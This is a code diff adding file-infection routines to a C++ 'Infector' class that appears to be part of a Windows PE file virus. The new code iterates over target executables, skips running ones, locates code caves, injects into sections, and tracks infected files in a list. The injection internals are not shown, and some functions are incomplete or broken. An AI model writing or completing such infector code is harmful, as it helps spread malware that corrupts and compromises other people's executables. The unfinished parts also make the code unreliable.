@@ -31,11 +31,7 @@ void Infector::read_file(std::filesystem::path p)
             infected_files.emplace_back(std::move(std::make_pair(file_path, index_file)));
         }
     }
-
-
     inf_file.close();
-
-
 }
 
 void Infector::write_file(std::filesystem::path p)
@@ -203,4 +199,86 @@ void Infector::files_to_infect()
 
 
 
+}
+
+void Infector::add_to_infected(std::filesystem::path p)
+{
+    int index_to_add = 0;
+
+    if (!infected_files.empty())
+    {
+        index_to_add = infected_files.back().second + 1;
+    }
+    else
+    {
+        index_to_add = 0;
+    }
+
+    infected_files.emplace_back(std::move(std::make_pair(p, index_to_add)));
+    number_of_files++;
+}
+
+void Infector::add_to_infected(std::filesystem::path p, int i)
+{
+    if (infected_files.empty())
+    {
+        add_to_infected(p);
+    }
+    for (auto& f : infected_files)
+    {
+
+    }
+}
+
+void Infector::infect_specific_file(std::filesystem::path p,int i)
+{
+    PE::PE_file pe_file(p, i);
+    if (!pe_file.is_file_running(p))
+    {
+        pe_file.map_file();
+        pe_file.parse_file();
+        pe_file.find_code_cave();
+        pe_file.infect_into_section();
+       // pe_file.freeFile();
+        add_to_infected(p, i);
+    }
+    else
+    {
+        std::cout << "cannot infect file that is running!";
+    }
+}
+
+
+void Infector::infect_files()
+{
+    for (auto& f : infected_files)
+    {
+        PE::PE_file pe_file(f.first, f.second);
+        if (!pe_file.is_file_running(f.first))
+        {
+            pe_file.map_file();
+            pe_file.parse_file();
+            pe_file.find_code_cave();
+            pe_file.infect_into_section();
+            pe_file.freeFile();
+        }
+    }
+}
+
+
+std::filesystem::path Infector::return_path_by_index(int i)
+{
+    if (infected_files.empty())
+    {
+        files_to_infect();
+        write_file("infected_files.txt");
+    }
+
+    for (auto& f : infected_files)
+    {
+        if (f.second == i)
+        {
+            return f.first;
+        }
+    }
 }
